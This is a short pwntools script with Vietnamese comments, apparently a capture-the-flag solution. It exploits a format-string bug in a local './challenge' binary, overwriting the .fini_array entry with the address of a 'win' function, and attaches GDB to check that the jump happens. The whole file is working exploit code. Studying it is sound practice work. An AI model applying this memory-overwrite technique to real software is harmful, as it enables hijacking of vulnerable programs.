from pwn import *

exe = './challenge'
elf = ELF(exe)
context.binary = exe
context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']

# Thay process thường bằng process có gdb (nếu máy bạn đã cài gdb và pwndbg/gef)
# Hoặc dùng gdb.attach
p = process(exe)

fini_array_addr = 0x403e18 # Giá trị bạn đã tìm được
win_addr = elf.sym['win']
offset = 6

# --- QUAN TRỌNG: Gắn GDB trước khi gửi payload ---
# Khi cửa sổ GDB hiện ra, bạn gõ 'c' (continue) rồi Enter để chương trình chạy tiếp
gdb.attach(p, gdbscript='''
    b *0x401216
    c
''')
# Lệnh trên đặt breakpoint ngay tại hàm win để xem có nhảy vào đó được không

payload = fmtstr_payload(offset, {fini_array_addr: win_addr}, write_size='short')
p.sendline(payload)
p.interactive()